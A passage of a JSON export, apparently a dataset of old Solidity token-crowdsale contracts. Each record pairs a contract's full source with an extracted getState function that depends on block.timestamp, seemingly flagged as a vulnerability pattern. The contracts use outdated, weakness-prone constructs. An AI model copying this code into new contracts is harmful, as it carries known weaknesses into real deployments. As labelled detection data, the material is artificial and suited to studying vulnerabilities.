getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f7b"
  },
  "filename": "9334.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f7c"
  },
  "filename": "9358.sol",
  "content": "pragma solidity ^0.4.13;\ninterface IAffiliateList {\n function set(address addr, uint startTimestamp, uint endTimestamp) external;\n function get(address addr) external view returns (uint start, uint end);\n function inListAsOf(address addr, uint time) external view returns (bool);\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract IInvestorList {\n string public constant ROLE_REGD = \"regd\";\n string public constant ROLE_REGCF = \"regcf\";\n string public constant ROLE_REGS = \"regs\";\n string public constant ROLE_UNKNOWN = \"unknown\";\n function inList(address addr) public view returns (bool);\n function addAddress(address addr, string role) public;\n function getRole(address addr) public view returns (string);\n function hasRole(address addr, string role) public view returns (bool);\n}\ncontract Ownable {\n address public owner;\n address public 